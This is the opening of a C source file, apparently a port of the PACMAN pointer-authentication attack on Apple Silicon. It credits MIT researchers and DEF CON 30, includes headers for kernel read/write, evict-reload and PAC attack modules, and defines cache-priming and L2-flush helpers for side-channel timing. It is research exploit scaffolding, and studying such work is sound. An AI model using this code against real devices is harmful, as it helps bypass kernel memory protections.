// Original exploit discovered by MIT Researchers Joseph Ravichandran, Weon Taek Na, Jay Lang and Mengjia Yang
// Exploit made public at the DEF CON 30 talk (https://pacmanattack.com)
// Fork of Joseph Ravichandran (aka jprx) PacmanAttack, originally coded in Rust

// Copyright © cxdxn1 2024, all rights reserved

// General headers used in C
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <mach/mach.h>

#define MEM_REGION_SIZE 0x40000000000

// C headers corresponding to originally used Rust modules
#include "Headers/libdarwin.h"
#include "qos.h"
#include "retpoline.h"
#include "tests.h"
#include "Headers/counter.h"
#include "evset.h"
#include "Headers/Libdarwin/kernel_rw.h"
#include "Headers/Attacks/evict_reload.h"
#include "Headers/Libdarwin/iokit.h"
#include "Headers/timer_msr.h"
#include "pacmankit.h"
#include "Headers/cache.h"
#include "msr.h"
#include "Headers/attacks.h"
#include "Headers/pac.h"
#include <pthread.h>

void init_memory(uint8_t* memory_region, size_t len) {
    size_t iter = 0;
    for (size_t i = 0; i < len; i += STRIDE) {
        if (iter >= EVSET_SIZE_MAX) { break; }
        *(volatile uint8_t*)(&memory_region[i]) = 0x41;
        volatile uint8_t value = *(volatile uint8_t*)(&memory_region[i]);
        iter++;
    }
}

// Flushes the L2 cache
void flush_cache(unsigned char* memory_region) {
    for (size_t i = 0; i < L2_SIZE; i += L1D_LINESIZE) {
        volatile unsigned char* ptr = &memory_region[i];
        *ptr = 0x41;
        volatile unsigned char dummy = *ptr;
        (void)dummy;  // suppress any unused variable warnings
    }
}